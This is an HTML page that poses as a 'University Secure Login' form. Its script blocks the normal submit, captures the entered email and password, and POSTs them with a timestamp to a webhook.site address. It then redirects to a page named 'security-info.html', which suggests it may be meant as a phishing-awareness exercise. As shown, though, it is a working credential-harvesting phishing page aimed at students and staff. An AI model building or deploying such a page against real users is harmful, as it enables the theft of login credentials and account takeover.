<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>University Login</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
        .login-container { width: 300px; margin: auto; padding: 20px; border: 1px solid #ccc; border-radius: 10px; box-shadow: 2px 2px 10px rgba(0,0,0,0.1); }
        input { width: 90%; padding: 10px; margin: 10px 0; }
        button { padding: 10px 20px; background: blue; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>

    <h2>University Secure Login</h2>
    <div class="login-container">
        <img src="logo.png" alt="University Logo" width="150">
        <form id="authForm">
            <input type="text" name="user" placeholder="University Email" required><br>
            <input type="password" name="pass" placeholder="Password" required><br>
            <button type="submit">Login</button>
        </form>
    </div>

    <script>
       document.getElementById("authForm").addEventListener("submit", function(event) {
        event.preventDefault(); // Prevent actual form submission

        let formData = new FormData();
        formData.append("user", document.querySelector('input[name="user"]').value);
        formData.append("pass", document.querySelector('input[name="pass"]').value);
        formData.append("action", "Login Attempt");
        formData.append("time", new Date());

        fetch("https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx", {
            method: "POST",
            body: formData
        })
        .then(response => {
            console.log("Webhook response received.");
            return response.text(); // Convert response to text (optional)
        })
        .then(data => {
            console.log("Server response:", data);
            window.location.href = "security-info.html"; // Redirect after successful send
        })
        .catch(error => {
            console.error("Error:", error);
            alert("There was an issue submitting the form. Please try again."); // Alert user if something goes wrong
        });
    });
    </script>

</body>
</html>
